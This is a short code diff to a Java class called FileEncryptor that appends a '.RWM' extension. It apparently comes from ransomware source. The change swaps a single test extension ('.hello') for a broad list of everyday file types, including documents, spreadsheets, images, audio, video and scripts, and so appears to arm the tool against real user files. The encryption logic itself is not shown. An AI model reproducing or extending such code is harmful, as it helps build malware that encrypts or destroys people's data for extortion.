@@ -13,10 +13,9 @@ public class FileEncryptor {
     private static final String EXTENSION = ".RWM";
 
     private static final String[] TARGET_EXTENSIONS = {
-        ".hello"
-        // ".pdf", ".xls", ".ppt", ".doc", ".accd", ".rtf", ".txt", ".py", ".csv",
-        // ".jpg", ".jpeg", ".png", ".gif", ".avi", ".midi", ".mov", ".mp3", ".mp4",
-        // ".mpeg", ".mpeg2", ".mpeg3", ".mpg", ".mkv", ".ogg"
+        ".pdf", ".xls", ".ppt", ".doc", ".accd", ".rtf", ".txt", ".py", ".csv",
+        ".jpg", ".jpeg", ".png", ".gif", ".avi", ".midi", ".mov", ".mp3", ".mp4",
+        ".mpeg", ".mpeg2", ".mpeg3", ".mpg", ".mkv", ".ogg"
     };
 
     private static final String[] TARGET_FOLDERS = {
